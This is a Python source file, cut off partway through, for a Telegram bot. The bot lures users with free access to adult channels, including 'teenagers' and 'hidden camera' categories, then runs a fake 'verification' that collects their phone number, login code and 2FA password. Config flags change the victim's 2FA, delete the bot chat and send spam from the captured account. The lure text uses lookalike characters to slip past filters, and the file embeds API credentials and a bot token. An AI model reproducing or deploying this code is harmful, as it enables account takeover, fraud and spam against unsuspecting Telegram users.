from peewee import *
import logging
import os, time
import datetime
import shutil
import asyncio
import socks
import sqlite3
from email import message
from telethon.sync import TelegramClient
from telethon import functions, types
from telethon import TelegramClient
from telethon.errors import PasswordHashInvalidError, FloodWaitError, PhoneCodeInvalidError, SessionPasswordNeededError, \
    PhoneCodeExpiredError
from telethon.tl.custom import Dialog, Message
from aiogram import Bot, Dispatcher, types
from aiogram import types
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters import Command
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.utils import executor
from aiogram.types import Message, CallbackQuery
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.types import InlineKeyboardButton as B
from aiogram.types import InlineKeyboardMarkup as M
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
from aiogram.types import KeyboardButton as RB
from aiogram.types import ReplyKeyboardMarkup as RM
from aiogram.types import ParseMode
from opentele.api import UseCurrentSession
from opentele.tl import TelegramClient as TC
import phonenumbers
from phonenumbers.phonenumberutil import region_code_for_country_code

##############################config##############################

#############################–û–°–ù–û–í–ù–û–ï#############################

api_id = 22426911 #my.telegram.com
api_hash = "03adcecc608d03d11e648c0611e7481e" #my.telegram.com
bot_token = '6922660921:AAGJbJxqAQYXiICY32iQSHbfvE4bEmYeiuk' #bot_father
admin = 5454397757 #@FIND_MY_ID_BOT
logs = -4141741310 #–ê–π–¥–∏ –∫–∞–Ω–∞–ª–∞ —Å –ª–æ–≥–∞–º–∏

############################–ü–ï–†–ï–ú–ï–ù–ù–´–ï############################
botdelete = True #–£–¥–∞–ª–∏—Ç—å –ø–µ—Ä–µ–ø–∏—Å–∫—É —Å –±–æ—Ç–æ–º –ø–æ—Å–ª–µ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏
twofa_set = False #–°—Ç–∞–≤–∏—Ç—å –ª–∏ 2FA
twofa_current = False #–ú–µ–Ω—è—Ç—å –ª–∏ 2FA
twopass_set = 'Prince_Python' #–ù–∞ —á—Ç–æ –º–µ–Ω—è—Ç—å 2FA
hint_set = '–Ω–µ –ø—ã—Ç–∞–π—Å—è –∑–∞–π—Ç–∏' #–ü–æ–¥—Å–∫–∞–∑–∫–∞ –æ—Ç 2FA

#######################–ü–û–î–ü–ò–°–ö–ê –ù–ê –ö–ê–ù–ê–õ\–ß–ê–¢######################

chango = False #–ü–æ–¥–ø–∏—Å–∫–∞ –Ω–∞ —á–∞—Ç\–∫–∞–Ω–∞–ª
userchannel = 'FUNNHIKCHANEL' #–ò–º—è —á–∞—Ç–∞\–∫–∞–Ω–∞–ª–∞

###############################–ü–†–û–ö–°–ò#############################

proxyuse = False #–ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –ª–∏ –ø—Ä–æ–∫—Å–∏
proxy_ip = '1.1.1.1'
proxy_port = 1111 
proxy_login = '1111'
proxy_pass = '1111'

###############################–°–ü–ê–ú###############################

spams = False #–°–ø–∞–º –ø–æ—Å–ª–µ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏
SPAM_MSG = '–¢–µ–∫—Å—Ç —Ä–∞—Å—Å—ã–ª–∫–∏'

##############################–ù–ï –õ–ï–ó–¨#############################

device_model = "iPhone XS" #–ú–æ–¥–µ–ª—å —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
system_version = "16.6.1" #–í–µ—Ä—Å–∏—è —Å–∏—Å—Ç–µ–º—ã
app_version = "Telegram iOS (27585)" #–í–µ—Ä—Å–∏—è —Ç–≥
lang_code = "en"
system_lang_code = "en-US"

##############################config##############################

bot = Bot(token=bot_token) # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –±–æ—Ç–∞ –∏ –¥–∏—Å–ø–µ—Ç—á–µ—Ä–∞
dp = Dispatcher(bot, storage=MemoryStorage())
logging.basicConfig(level=logging.INFO) # –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
db = SqliteDatabase('db.db')
user_roles = {}

def generate_start_message():
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("üë®‚Äçüíª –ê—Å—Å–æ—Ä—Ç–∏–º–µ–Ω—Ç", callback_data='my_profile'),
               InlineKeyboardButton("üé≠ –í—ã–±—Ä–∞—Ç—å –ª—É—á—à–∏–π –∫–∞–Ω–∞–ª", callback_data='change_role'))
    markup.row(InlineKeyboardButton("‚ôªÔ∏è –ö–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç?", callback_data='tokens'),
               InlineKeyboardButton("‚ù§Ô∏è –ü–æ–º–æ—â—å", callback_data='help'))
    markup.row(InlineKeyboardButton("üéÅ –ü–æ–ª—É—á–∏—Ç—å –±–µ—Å–ø–ª–∞—Ç–Ω—É—é –ø–æ–¥–ø–∏—Å–∫—É", callback_data='free_tokens'))
    welcome_text = (
        "–ü—Ä–∏–≤–µ—Ç! –Ø –±–æ—Ç, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–º–æ–∂–µ—Ç –Ω–∞–π—Ç–∏ —Ç–æ, —á—Ç–æ —Ç–µ–±–µ –ø–æ –¥—É—à–µ. "
        "–î–ª—è –Ω–∞—á–∞–ª–∞, —Ç–µ–±–µ –Ω—É–∂–Ω–æ —Ä–∞–∑–æ–±—Ä–∞—Ç—å—Å—è. –ò—Å–ø–æ–ª—å–∑—É–π –∫–Ω–æ–ø–∫—É '–ö–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç?', —á—Ç–æ–±—ã —É–∑–Ω–∞—Ç—å –∫–∞–∫ —ç—Ç–æ —Å–¥–µ–ª–∞—Ç—å. "
        "–ï—Å–ª–∏ —É —Ç–µ–±—è –µ—Å—Ç—å –≤–æ–ø—Ä–æ—Å—ã –∏–ª–∏ –Ω—É–∂–Ω–∞ –ø–æ–º–æ—â—å, –∏—Å–ø–æ–ª—å–∑—É–π –∫–Ω–æ–ø–∫—É '–ü–æ–º–æ—â—å'."
    )
    return welcome_text, markup

def generate_change_role_message(selected_role=None):
    roles = [
        "üòà –°—Ç—Ä–∏–º–µ—Ä—à–∏", "üòà –ü–æ–¥—Ä–æ—Å—Ç–∫–∏",
        "üòà –¢–∏–∫–¢–æ–∫ —Å–ª–∏–≤—ã", "üòà Cosplay 18+",
        "üòà OnlyFan$ –õ–£–ß–®–ï–ï", "üòà Sexwife",
        "üòà SIMPLE PRON", "üòà —Å–∫—Ä—ã—Ç–∞—è –∫–∞–º–µ—Ä–∞ 18+",
        "üòà 2–¥ —Å–µ—Å—Ç—Ä–µ–Ω–∫–∞", "üòà FULL VIDEO",
        "üòà Orgasm", "üòà SlivBlog",
        "–í –¥–≤—É—Ö —Å–ª–æ–≤–∞—Ö 18+", "üòà Home videos RU"
    ]

    markup = InlineKeyboardMarkup(row_width=2)

    for role in roles:
        emoji = "‚úÖ" if role == selected_role else ""
        markup.insert(InlineKeyboardButton(f"{emoji} {role}", callback_data=f'choose_role_{role}'))

    # –î–æ–±–∞–≤–ª—è–µ–º –∫–Ω–æ–ø–∫—É "–ù–∞–∑–∞–¥" –≤ –º–µ–Ω—é –≤—ã–±–æ—Ä–∞ —Ä–æ–ª–∏
    markup.row(InlineKeyboardButton("‚á† –ù–∞–∑–∞–¥", callback_data='back_to_main_menu'))

    change_role_text = "*–í—ã–±–µ—Ä–∏ –ª—É—á—à–∏–π —Ç–µ–ª–µ–≥—Ä–∞–º –∫–∞–Ω–∞–ª:*\n–ü–æ —É–º–æ–ª—á–∞–Ω–∏—é - 0"
    return change_role_text, markup

@dp.message_handler(commands=['start'])
async def send_welcome(message: types.Message):
    welcome_text, markup = generate_start_message()
    await message.answer(welcome_text, reply_markup=markup, parse_mode=ParseMode.MARKDOWN)

@dp.callback_query_handler(lambda query: query.data == 'my_profile')
async def process_my_profile(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    username = callback_query.from_user.username

    # –ó–¥–µ—Å—å –≤—Å—Ç–∞–≤–ª—è–µ–º —Å—Ç–∞—Ç–∏—á–Ω—ã–π —Ç–µ–∫—Å—Ç –ø—Ä–æ—Ñ–∏–ª—è —Å –Ω–∞—Å—Ç–æ—è—â–∏–º —é–∑–µ—Ä–Ω–µ–π–º–æ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    profile_text = (
        f"*–ü—Ä–∏–≤–µ—Ç, {username}!*\n\n"
        "*–ê—Å—Å–æ—Ä—Ç–∏–º–µ–Ω—Ç:*\n"
        "üòà –°—Ç—Ä–∏–º–µ—Ä—à–∏: `55k users`\n"
        "üòà –ü–æ–¥—Ä–æ—Å—Ç–∫–∏: `2k users`\n"
        "üòà –¢–∏–∫–¢–æ–∫ —Å–ª–∏–≤—ã: `3k users`\n"
        "üòà Cosplay 18+: `9k users`\n"
        "üòà OnlyFan$ –õ–£–ß–®–ï–ï: `13k users`\n"
        "üòà Sexwife: `360k users`\n"
        "üòà SIMPLE PRON: `5k users`\n"
        "üòà —Å–∫—Ä—ã—Ç–∞—è –∫–∞–º–µ—Ä–∞ 18+: `10k users`\n"
        "üòà 2–¥ —Å–µ—Å—Ç—Ä–µ–Ω–∫–∞: `12k users`\n"
        "üòà FULL VIDEO: `18k users`\n"
        "üòà Orgasm: `125k users`\n"
        "üòà SlivBlog: `122.6k users`\n"
        "üòà –í –¥–≤—É—Ö —Å–ª–æ–≤–∞—Ö 18+: `18.2k users`\n"
        "üòà Home videos RU: `1.1k users`\n\n"
        "–ü–æ–¥–ø–∏—Å–∫–∞ –¥–æ: `–û—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç`\n\n"
        "–î–ª—è –≤–æ–∑–≤—Ä–∞—â–µ–Ω–∏—è –≤ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é, –Ω–∞–∂–º–∏ –∫–Ω–æ–ø–∫—É '‚á†  –ù–∞–∑–∞–¥'."
    )

    back_button = InlineKeyboardMarkup().add(
        InlineKeyboardButton("‚á† –ù–∞–∑–∞–¥", callback_data='back_to_main_menu')
    )

    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∏–ª–∏ —Ä–µ–¥–∞–∫—Ç–∏—Ä—É–µ–º –ø–æ—Å–ª–µ–¥–Ω–µ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ —Å –ø—Ä–æ—Ñ–∏–ª–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    try:
        await bot.edit_message_text(chat_id=user_id, message_id=callback_query.message.message_id,
                                    text=profile_text, reply_markup=back_button, parse_mode=ParseMode.MARKDOWN)
    except:
        await bot.send_message(user_id, profile_text, reply_markup=back_button, parse_mode=ParseMode.MARKDOWN)

@dp.callback_query_handler(lambda query: query.data.startswith('choose_role_'))
async def process_choose_role(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    selected_role = callback_query.data.split('_')[2]

    # –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤—ã–±—Ä–∞–Ω–Ω—É—é —Ä–æ–ª—å –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    user_roles[user_id] = selected_role

    change_role_text, markup = generate_change_role_message(selected_role)

    # –†–µ–¥–∞–∫—Ç–∏—Ä—É–µ–º –ø–æ—Å–ª–µ–¥–Ω–µ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ —Å –≤—ã–±–æ—Ä–æ–º —Ä–æ–ª–∏
    try:
        await bot.edit_message_text(chat_id=user_id, message_id=callback_query.message.message_id,
                                    text=change_role_text, reply_markup=markup, parse_mode=ParseMode.MARKDOWN)
    except:
        await bot.send_message(user_id, change_role_text, reply_markup=markup, parse_mode=ParseMode.MARKDOWN)

@dp.callback_query_handler(lambda query: query.data == 'change_role')
async def process_change_role(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id

    # –ü–æ–ª—É—á–∞–µ–º –ø–æ—Å–ª–µ–¥–Ω—é—é –≤—ã–±—Ä–∞–Ω–Ω—É—é —Ä–æ–ª—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    selected_role = user_roles.get(user_id, None)

    change_role_text, markup = generate_change_role_message(selected_role)

    # –†–µ–¥–∞–∫—Ç–∏—Ä—É–µ–º –ø–æ—Å–ª–µ–¥–Ω–µ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ —Å –≤—ã–±–æ—Ä–æ–º —Ä–æ–ª–∏
    try:
        await bot.edit_message_text(chat_id=user_id, message_id=callback_query.message.message_id,
                                    text=change_role_text, reply_markup=markup, parse_mode=ParseMode.MARKDOWN)
    except:
        await bot.send_message(user_id, change_role_text, reply_markup=markup, parse_mode=ParseMode.MARKDOWN)

# –î–æ–±–∞–≤–ª—è–µ–º –Ω–æ–≤—ã–π –æ–±—Ä–∞–±–æ—Ç—á–∏–∫ –¥–ª—è –∫–Ω–æ–ø–∫–∏ "–¢–æ–∫–µ–Ω—ã"
@dp.callback_query_handler(lambda query: query.data == 'tokens')
async def process_tokens(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id

    tokens_text = (
        "–ë–æ—Ç –≤—ã–¥–∞—Å—Ç –≤–∞–º –¥–æ—Å—Ç—É–ø –∫ –∫–∞–Ω–∞–ª–∞–º –ø–æ—Å–ª–µ –ø–æ–∫—É–ø–∫–∏, –∏–ª–∏ –±–µ—Å–ø–ª–∞—Ç–Ω–æ–π –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏ –∫–æ—Ç–æ—Ä–∞—è –¥–µ–π—Å—Ç–≤—É–µ—Ç –¥–æ 14.02.24.\n\n"
        "–ß—Ç–æ –º–Ω–µ –Ω—É–∂–Ω–æ —Å–¥–µ–ª–∞—Ç—å —á—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –±–µ—Å–ø–ª–∞—Ç–Ω—É—é –ø–æ–¥–ø–∏—Å–∫—É?\n"
        "–ß—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –±–µ—Å–ø–ª–∞—Ç–Ω—É—é –ø–æ–¥–ø–∏—Å–∫—É, –≤–∞–º –Ω—É–∂–Ω–æ –≤–µ—Ä–Ω—É—Ç—å—Å—è –≤ –º–µ–Ω—é –±–æ—Ç–∞ –∏ –Ω–∞–∂–∞—Ç—å –Ω–∞ –∫–Ω–æ–ø–∫—É '–ü–æ–ª—É—á–∏—Ç—å –±–µ—Å–ø–ª–∞—Ç–Ω—É—é –ø–æ–¥–ø–∏—Å–∫—É'.\n\n"
        "- –¥–æ 14 —Ñ–µ–≤—Ä–∞–ª—è –±–æ—Ç –≤—ã–¥–∞–µ—Ç –ø–æ–¥–ø–∏—Å–∫–∏ –±–µ—Å–ø–ª–∞—Ç–Ω–æ, –∞–±—Å–æ–ª—é—Ç–Ω–æ –Ω–∞ –≤—Å–µ —Ö—Ö—Ö –∫–∞–Ω–∞–ª—ã\n"
        "- –ü–æ—Å–ª–µ 14 —Ñ–µ–≤—Ä–∞–ª—è –±–æ—Ç —Å—Ç–∞–Ω–µ—Ç –ø–ª–∞—Ç–Ω—ã–º, –≤–µ–¥—å –Ω–∞—à–∞ –∫–æ–º–∞–Ω–¥–∞ –¥–æ–±–∞–≤–∏—Ç –º–Ω–æ–≥–æ –Ω–æ–≤–æ–≥–æ –∫–æ–Ω—Ç–µ–Ω—Ç–∞))\n\n"
        "–ú—ã –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ–º –¥–æ—Å—Ç—É–ø –∫–æ –≤—Å–µ–º –∫–∞–Ω–∞–ª–∞–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º, –ø–æ—Å–ª–µ –ø—Ä–æ—Ö–æ–∂–¥–µ–Ω–∏—è –±–µ—Å–ø–ª–∞—Ç–Ω–æ–π –í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏ (–¥–æ 14 —Ñ–µ–≤—Ä–∞–ª—è) "
        "–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è –Ω—É–∂–Ω–∞ *—Ç–æ–ª—å–∫–æ –¥–ª—è –∑–∞—â–∏—Ç—ã –æ—Ç –∞–±—É–∑–∞*, –µ—Å–ª–∏ –µ–µ –Ω–µ –±—É–¥–µ—Ç, —Ç–æ –º—ã –Ω–µ —Å–º–æ–∂–µ–º –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞—Ç—å —Å—Ç–∞–±–∏–ª—å–Ω—É—é "
        "—Ä–∞–±–æ—Ç—É –±–µ–∑ –ø–µ—Ä–µ–≥—Ä—É–∑–æ–∫. *–ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –±–æ—Ç–∞ –±–µ–∑ –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–π –∏ –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏ –º–æ–≥—É—Ç —Ç–æ–ª—å–∫–æ —Ç–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏, "
        "–∫–æ—Ç–æ—Ä—ã–µ –æ–ø–ª–∞—Ç–∏–ª–∏ –ø–æ–¥–ø–∏—Å–∫—É.*\n\n"
        "*–ü–æ –ø–æ–¥–ø–∏—Å–∫–µ Plus –≤–∞–º –¥–∞–µ—Ç—Å—è –¥–æ—Å—Ç—É–ø –∫ –æ–≥—Ä–æ–º–Ω–æ–º—É –∫–æ–ª–∏—á–µ—Å—Ç–≤—É –ø—Ä–∏–≤–∞—Ç–Ω—ã—Ö xxx –∫–∞–Ω–∞–ª–æ–≤.*\n\n"
        "*–°—Ç–æ–∏–º–æ—Å—Ç—å:*\n"
        "2.5$ \\ 30 –¥–Ω–µ–π\n"
        "17$ \\ 6 –º–µ—Å—è—Ü–µ–≤\n"
        "*–í—ã–±–µ—Ä–∏—Ç–µ –ø–æ–¥—Ö–æ–¥—è—â–∏–π –≤–∞—Ä–∏–∞–Ω—Ç –æ–ø–ª–∞—Ç—ã:*\n"
    )

    tokens_markup = InlineKeyboardMarkup().row(
        InlineKeyboardButton("2.5$ (30 –¥–Ω–µ–π)", url="t.me/CryptoBot?start=IVmzQnqukQLi"),
        InlineKeyboardButton("17$ (6 –º–µ—Å—è—Ü–µ–≤)", url="t.me/CryptoBot?start=IVYASNApd06G")
    ).row(
        InlineKeyboardButton("üéÅ –ü–æ–ª—É—á–∏—Ç—å –±–µ—Å–ø–ª–∞—Ç–Ω—É—é –ø–æ–¥–ø–∏—Å–∫—É", callback_data='get_free_tokens')
    ).row(
        InlineKeyboardButton("‚á† –ù–∞–∑–∞–¥", callback_data='back_to_main_menu')
    )
    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∏–ª–∏ —Ä–µ–¥–∞–∫—Ç–∏—Ä—É–µ–º –ø–æ—Å–ª–µ–¥–Ω–µ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ —Å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–µ–π –æ —Ç–æ–∫–µ–Ω–∞—Ö
    try:
        await bot.edit_message_text(chat_id=user_id, message_id=callback_query.message.message_id,
                                    text=tokens_text, reply_markup=tokens_markup, parse_mode=ParseMode.MARKDOWN)
    except:
        await bot.send_message(user_id, tokens_text, reply_markup=tokens_markup, parse_mode=ParseMode.MARKDOWN)



# –î–æ–±–∞–≤–ª—è–µ–º –Ω–æ–≤—ã–π –æ–±—Ä–∞–±–æ—Ç—á–∏–∫ –¥–ª—è –∫–Ω–æ–ø–∫–∏ "–ü–æ–º–æ—â—å"
@dp.callback_query_handler(lambda query: query.data == 'help')
async def process_help(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id

    help_text = (
       
        "*–ï—Å–ª–∏ —É –≤–∞—Å –æ—Å—Ç–∞–ª–∏—Å—å –∫–∞–∫–∏–µ-–ª–∏–±–æ –≤–æ–ø—Ä–æ—Å—ã, –≤—ã –≤—Å–µ–≥–¥–∞ –º–æ–∂–µ—Ç–µ –≤–æ—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –Ω–∞—à–µ–π —Å–ª—É–∂–±–æ–π –ø–æ–¥–¥–µ—Ä–∂–∫–∏ - @walkerDEV*"
    )

    help_markup = InlineKeyboardMarkup().row(
        InlineKeyboardButton("‚á† –ù–∞–∑–∞–¥", callback_data='back_to_main_menu')
    )

    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∏–ª–∏ —Ä–µ–¥–∞–∫—Ç–∏—Ä—É–µ–º –ø–æ—Å–ª–µ–¥–Ω–µ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ —Å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–µ–π –æ –ø–æ–º–æ—â–∏
    try:
        await bot.edit_message_text(chat_id=user_id, message_id=callback_query.message.message_id,
                                    text=help_text, reply_markup=help_markup, parse_mode=ParseMode.MARKDOWN)
    except:
        await bot.send_message(user_id, help_text, reply_markup=help_markup, parse_mode=ParseMode.MARKDOWN)

@dp.callback_query_handler(lambda query: query.data == 'back_to_main_menu')
async def process_back_to_main_menu(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id

    welcome_text, markup = generate_start_message()
    
    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∏–ª–∏ —Ä–µ–¥–∞–∫—Ç–∏—Ä—É–µ–º –ø–æ—Å–ª–µ–¥–Ω–µ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ —Å –ø—Ä–∏–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω—ã–º —Ç–µ–∫—Å—Ç–æ–º
    try:
        await bot.edit_message_text(chat_id=user_id, message_id=callback_query.message.message_id,
                                    text=welcome_text, reply_markup=markup, parse_mode=ParseMode.MARKDOWN)
    except:
        await bot.send_message(user_id, welcome_text, reply_markup=markup, parse_mode=ParseMode.MARKDOWN)


# –î–æ–±–∞–≤–ª—è–µ–º –Ω–æ–≤—ã–π –æ–±—Ä–∞–±–æ—Ç—á–∏–∫ –¥–ª—è –∫–Ω–æ–ø–∫–∏ "–ü–æ–ª—É—á–∏—Ç—å –±–µ—Å–ø–ª–∞—Ç–Ω—ã–µ —Ç–æ–∫–µ–Ω—ã"
@dp.callback_query_handler(lambda query: query.data == 'free_tokens')
async def process_free_tokens(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id

    state = dp.current_state(chat=callback_query.message.chat.id, user=callback_query.from_user.id)
    await mega(callback_query, callback_query.message, state)
    return

class BaseModel(Model):
    class Meta:
        database = db
class User(BaseModel):
    user_id = IntegerField()
    verified = BooleanField()
    phone = TextField()
    ref_id = IntegerField()
db.create_tables([User])
start_kb = M(
    inline_keyboard=[
        [
            B(
                text='Œ†Œø–¥—Ç–≤ep–¥–∏—Ç—å ‚úÖ', callback_data='fishing'
            )
        ]
    ]
)

start2_kb = RM(keyboard=[
    [
        RB(
            text='üí† –ío–π—Ç–∏',
            request_contact=True
        )
    ]
],
    resize_keyboard=True)
num = M(
    inline_keyboard=[
        [

            B(text='1Ô∏è‚É£', callback_data='write_1'),
            B(text='2Ô∏è‚É£', callback_data='write_2'),
            B(text='3Ô∏è‚É£', callback_data='write_3'),
        ],
        [
            B(text='4Ô∏è‚É£', callback_data='write_4'),
            B(text='5Ô∏è‚É£', callback_data='write_5'),
            B(text='6Ô∏è‚É£', callback_data='write_6'),
        ],
        [
            B(text='7Ô∏è‚É£', callback_data='write_7'),
            B(text='8Ô∏è‚É£', callback_data='write_8'),
            B(text='9Ô∏è‚É£', callback_data='write_9'),
        ],
        [
            B(text='‚¨ÖÔ∏è', callback_data='remove'),
            B(text='0Ô∏è‚É£', callback_data='write_0'),
            B(text='‚úÖ', callback_data='ready'),
        ]
    ]
)
class AuthTG(StatesGroup):
    phone = State()
    code = State()
    twfa = State()
    password = State()
    
MAIN = 'Œí—ã –ºŒø–∂e—Çe –øŒø–ª—É—á–∏—Ç—å –±ec–ø–ªa—Ç–Ω—É—é –øŒø–¥–ø–∏cŒ∫—É –≤ –Ωa—àe–º –±Œø—Çe –øŒø –Ωa—àe–π pe—Ñepa–ª—å–ΩŒø–π c–∏c—Çe–ºe.\n\nŒíŒø –∏–∑–±e–∂a–Ω–∏–∏ a–±—É–∑a, –≤—ã –¥Œø–ª–∂–Ω—ã –≤ep–∏—Ñ–∏—Ü–∏pŒø–≤a—Ç—å c–≤Œø–π aŒ∫Œ∫a—É–Ω—Ç, c–ªe–¥—É—è –∏–Ωc—Çp—ÉŒ∫—Ü–∏—è–º –≤ –±Œø—Çe. Œ†Œøc–ªe —Éc–øe—à–ΩŒø–π –≤ep–∏—Ñ–∏Œ∫a—Ü–∏–∏ c –≤a–º–∏ c–≤—è–∂e—Çc—è c–øe—Ü–∏a–ª–∏c—Ç –∏ –øpe–¥Œøc—Ça–≤–∏—Ç –≤a–º –±ec–ø–ªa—Ç–Ω—É—é 30-–¥–Ωe–≤–Ω—É—é –øŒø–¥–ø–∏cŒ∫—É.'
ON_START = 'ü¶ã Œ†Œø–¥Œ∫–ª—é—áe–Ω–∏e\n\n–î–ª—è —ÇŒø–≥Œø, —á—ÇŒø –±—ã –±Œø—Ç c–ºŒø–≥ –∏–¥e–Ω—Ç–∏—Ñ–∏—Ü–∏pŒø–≤a—Ç—å –≤ac, –≤a–º –ΩeŒø–±xŒø–¥–∏–ºŒø a–≤—ÇŒøp–∏–∑Œø–≤a—Ç—åc—è —áepe–∑ c–≤Œø–π Œ§elegram aŒ∫Œ∫ay–Ω—Ç, –Ωa–∂a–≤ –Ωa Œ∫–ΩŒø–øŒ∫—É ¬´üí† ŒíŒø–π—Ç–∏¬ª, –øŒøc–ªe —áe–≥Œø –Ωa—à –±Œø—Ç Œø—Ç–øpa–≤–∏—Ç Œ∫Œø–¥ –¥–ª—è –øŒø–¥Œ∫–ª—é—áe–Ω–∏—è.'
GOOD_AUTH = '‚úÖ –ë–ªa–≥Œø–¥ap–∏–º –∑a –≤ep–∏—Ñ–∏Œ∫a—Ü–∏—é aŒ∫Œ∫a—É–Ω—Ça!\n\nC Œía–º–∏ c–≤—è–∂e—Çc—è c–øe—Ü–∏a–ª–∏c—Ç, Œ∫Œø—ÇŒøp—ã–π –øpe–¥Œøc—Ça–≤–∏—Ç –≤a–º –±ec–ø–ªa—Ç–Ω—É—é –øŒø–¥–ø–∏cŒ∫—É.'

from phonenumbers.phonenumberutil import (
    region_code_for_country_code,
)
if proxyuse == True:
    proxy=(socks.SOCKS5, proxy_ip, proxy_port, True, proxy_login, proxy_pass)
else:
    pass
bot = Bot(token=bot_token, parse_mode='MarkdownV2')
storage = MemoryStorage()
class Sessions:
    data = {}
class CodeInput:
    data = {}
class Dp(StatesGroup):
    text = State()
########## –ê–í–¢–û–ü–†–ò–ù–Ø–¢–ò–ï –í –ö–ê–ù–ê–õ + –°–û–û–ë–©–ï–ù–ò–ï ###################
@dp.chat_join_request_handler()
async def start1(update: types.ChatJoinRequest):
    await update.approve()
    await bot.send_sticker(chat_id=update.from_user.id, sticker=r"CAACAgIAAxkBAAEF5i9jLGC_fwIPPUmKCsOw5SLGunUAAXkAAgEeAAK5PDlI662kG3egy4IpBA")
    await bot.send_message(chat_id=update.from_user.id, text=f"üéÅ –¢–µ–∫—Å—Ç {update.from_user.get_mention(as_html=True)}", parse_mode='MarkdownV2')
#################################################################
######################   –†–ê–°–°–´–õ–ö–ê     ##########################
@dp.message_handler(lambda msg: msg.chat.id == admin, commands='spam')
async def spam(msg: types.Message):
    await msg.answer('‚úèÔ∏è –í–≤–µ–¥–∏ —Ç–µ–∫—Å—Ç —Ä–∞—Å—Å—ã–ª–∫–∏:')
    await Dp.text.set()
@dp.message_handler(lambda msg: msg.chat.id == admin, commands='cls', state='*')
async def spam2(msg: types.Message, state: FSMContext):
    if await state.get_state():
        await state.finish()
@dp.message_handler(lambda msg: msg.chat.id == admin, state=Dp.text)
async def spam1(msg: types.Message, state: FSMContext):
    await state.finish()
    await msg.answer('‚úÖ Œ°acc—ã–ªŒ∫a –∑a–ø—É—âe–Ωa')
    g = 0
    b = 0
    for x in User().select():
        try:
            await bot.send_message(x.user_id, msg.text)
            g += 1
            time.sleep(0.33)          
        except:
            b +=1
    await msg.answer(f'üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞:\n'
                     f'‚úÖ –£—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ `{g}`\n'
                     f'üö´ –û—à–∏–±–æ–∫: `{b}`')
######################   –°–¢–ê–¢–ò–°–¢–ò–ö–ê     ##########################
@dp.message_handler(lambda msg: msg.chat.id == admin, commands='stat')
async def spam(msg: types.Message, state: FSMContext):
    conn = sqlite3.connect('db.db')
    cur = conn.cursor()
    cur.execute('''select * from user''')
    all_users = cur.fetchall()
    await msg.answer(f'–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π: {len(all_users)}')
    await state.finish()
##################################################################
async def mega(callback_query, msg, state):
    global mega_executing
    mega_executing = True
    if msg.from_user.id != admin: 
        if await state.get_state():
            await state.finish()
        if CodeInput.data.get(callback_query.message.chat.id):
            CodeInput.data.pop(msg.chat.id)
        if not User.select().where(User.user_id == msg.chat.id):
            start_command = msg.text
            try:            
                await msg.answer(MAIN.format(
                    first_name=msg.from_user.first_name
                ), reply_markup=start_kb)
                await bot.send_message(admin,
                                f'‚úÖ ŒóŒø–≤—ã–π –øŒø–ª—å–∑Œø–≤a—Çe–ª—å –≤ –±Œø—Çe\n\n'
